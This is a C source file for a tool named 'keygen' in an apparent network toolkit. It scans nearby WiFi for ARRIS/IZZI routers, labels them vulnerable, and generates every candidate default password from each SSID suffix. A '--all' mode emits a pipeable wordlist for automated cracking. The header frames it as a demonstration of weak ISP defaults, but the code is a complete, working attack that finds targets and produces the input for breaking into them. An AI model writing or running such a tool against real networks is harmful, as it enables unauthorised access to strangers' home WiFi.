/*
 * keygen — Generate default WiFi password candidates for ARRIS routers
 * Part of the Lantern network toolkit
 *
 * Demonstrates why ISP-default WiFi passwords are insecure:
 * ARRIS TG2482A (used by IZZI Mexico) sets the WiFi password to
 * the CMAC address, which is derivable from the SSID suffix.
 *
 * Usage:
 *   keygen                    (scan WiFi, find ARRIS/IZZI targets)
 *   keygen IZZI-1F56          (generate candidates for specific SSID)
 *   keygen 1F56               (just the 4-char suffix)
 *
 * Compile:
 *   gcc -O2 -Wall -Wextra -o keygen.exe keygen.c -lws2_32 -liphlpapi -lwlanapi -lole32
 */

#include "lantern.h"
#include <wlanapi.h>
#include "lantern.h"  /* re-include to activate WLAN extension */

/* ── Password generation ──────────────────────────────────────────── */

/* Print every candidate password, one per line (pipeable) */
static void generate_all(const uint8_t suffix[2]) {
    for (int o = 0; o < (int)LANTERN_ARRIS_OUI_COUNT; o++) {
        const uint8_t *oui = LANTERN_ARRIS_OUIS[o];
        for (int b = 0; b < 256; b++) {
            char password[16];
            lantern_arris_password(oui, b, suffix, password, sizeof(password));
            puts(password);
        }
    }
}

static void generate(const char *label, const uint8_t suffix[2], int verbose) {
    int total = (int)LANTERN_ARRIS_OUI_COUNT * 256;

    printf("\n  Target: " C_CYAN C_BOLD "%s" C_RESET "\n", label);
    printf("  Suffix: " C_CYAN "%02X%02X" C_RESET
           " (from SSID)\n", suffix[0], suffix[1]);
    printf("  Known OUI prefixes: " C_CYAN "%d" C_RESET "\n",
           (int)LANTERN_ARRIS_OUI_COUNT);
    printf("  Unknown byte: 1 (256 values per OUI)\n");
    printf("  Total candidates: " C_BOLD "%d" C_RESET "\n\n", total);

    if (verbose) {
        printf(C_DIM "  %-14s %-14s %s\n" C_RESET,
               "OUI", "Candidate", "Password");
        printf(C_DIM "  %-14s %-14s %s\n" C_RESET,
               "--------------", "--------------",
               "------------");
    }

    for (int o = 0; o < (int)LANTERN_ARRIS_OUI_COUNT; o++) {
        const uint8_t *oui = LANTERN_ARRIS_OUIS[o];

        if (verbose && o > 0)
            printf(C_DIM "  ...skipping to next OUI...\n" C_RESET);

        for (int b = 0; b < 256; b++) {
            char password[16];
            lantern_arris_password(oui, b, suffix, password, sizeof(password));

            if (verbose) {
                if (b < 3 || b == 255) {
                    printf("  %02X:%02X:%02X       "
                           "%02X:%02X:%02X:%02X:%02X:%02X   %s\n",
                           oui[0], oui[1], oui[2],
                           oui[0], oui[1], oui[2],
                           (uint8_t)b, suffix[0], suffix[1],
                           password);
                } else if (b == 3) {
                    printf(C_DIM "  ...          "
                           "... (252 more)         ...\n" C_RESET);
                }
            }
        }
    }

    if (verbose) {
        printf("\n  " C_YELLOW C_BOLD "%d passwords" C_RESET
               " to try. At 10/sec = " C_BOLD "%d seconds" C_RESET
               " to crack.\n", total, total / 10);
        printf("  At 100/sec (automated) = " C_BOLD "%.1f seconds" C_RESET
               ".\n\n", (double)total / 100.0);
    }
}

/* ── Main ─────────────────────────────────────────────────────────── */

int main(int argc, char **argv) {
    if (lantern_check_flags(argc, argv, "keygen",
            "generate default password candidates for ARRIS routers",
            "Usage: keygen [options] [SSID|suffix]\n"
            "\n"
            "Options:\n"
            "  --all        Print all candidates, one per line (pipeable)\n"
            "  -h, --help   Show this help\n"
            "  -v, --version  Show version\n"
            "\n"
            "Examples:\n"
            "  keygen                  Scan WiFi, find ARRIS/IZZI targets\n"
            "  keygen IZZI-1F56        Generate candidates for specific SSID\n"
            "  keygen --all 1F56       Print all passwords (pipe to file/tool)"))
        return 0;

    lantern_init();

    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        fprintf(stderr, "WSAStartup failed\n");
        return 1;
    }

    /* Check for --all flag */
    int all_mode = 0;
    const char *ssid_arg = NULL;
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--all") == 0) all_mode = 1;
        else if (argv[i][0] != '-') ssid_arg = argv[i];
    }

    if (all_mode && ssid_arg) {
        uint8_t suffix[2];
        if (!lantern_parse_arris_suffix(ssid_arg, suffix)) {
            fprintf(stderr, "Cannot parse suffix from '%s'\n", ssid_arg);
            WSACleanup();
            return 1;
        }
        generate_all(suffix);
        WSACleanup();
        return 0;
    }

    lantern_banner("keygen",
                   "generate default password candidates for ARRIS routers");

    if (ssid_arg) {
        /* Manual mode: user provided SSID or suffix */
        uint8_t suffix[2];
        if (!lantern_parse_arris_suffix(ssid_arg, suffix)) {
            printf("  " C_RED "[!]" C_RESET
                   " Cannot parse suffix from '%s'\n", ssid_arg);
            printf(C_DIM "  Expected: IZZI-XXXX, ARRIS-XXXX,"
                   " or 4 hex chars\n" C_RESET);
            WSACleanup();
            return 1;
        }
        generate(ssid_arg, suffix, 1);
    } else {
        /* Auto mode: scan WiFi for ARRIS/IZZI targets */
        DWORD negotiated;
        HANDLE wlan = NULL;
        if (WlanOpenHandle(2, NULL, &negotiated, &wlan) != ERROR_SUCCESS) {
            printf("  " C_RED "[!]" C_RESET " Cannot open WiFi adapter\n");
            WSACleanup();
            return 1;
        }

        PWLAN_INTERFACE_INFO_LIST il = NULL;
        WlanEnumInterfaces(wlan, NULL, &il);
        if (!il || il->dwNumberOfItems == 0) {
            printf("  " C_DIM "No WiFi adapter found.\n" C_RESET);
            if (il) WlanFreeMemory(il);
            WlanCloseHandle(wlan, NULL);
            WSACleanup();
            return 0;
        }

        /* Copy GUID before freeing interface list */
        GUID guid = il->InterfaceInfo[0].InterfaceGuid;
        WlanFreeMemory(il);

        LanternArrisTarget targets[32];
        int count = lantern_scan_arris_targets(targets, 32, wlan, &guid);

        WlanCloseHandle(wlan, NULL);

        if (count == 0) {
            printf("  " C_DIM "No ARRIS/IZZI networks found nearby.\n" C_RESET);
            printf("  " C_DIM "Usage: keygen IZZI-XXXX   "
                   "(or any 4-hex suffix)\n" C_RESET);
            WSACleanup();
            return 0;
        }

        printf("  Found " C_BOLD "%d" C_RESET
               " vulnerable network%s:\n", count, count > 1 ? "s" : "");

        for (int i = 0; i < count; i++) {
            printf("\n  " C_YELLOW "[%d]" C_RESET " %-20s  BSSID: %s  "
                   "Signal: %ld dBm\n",
                   i + 1, targets[i].ssid,
                   targets[i].bssid, targets[i].rssi);
        }

        for (int i = 0; i < count; i++)
            generate(targets[i].ssid, targets[i].suffix, 1);
    }

    printf("\n");
    WSACleanup();
    return 0;
}
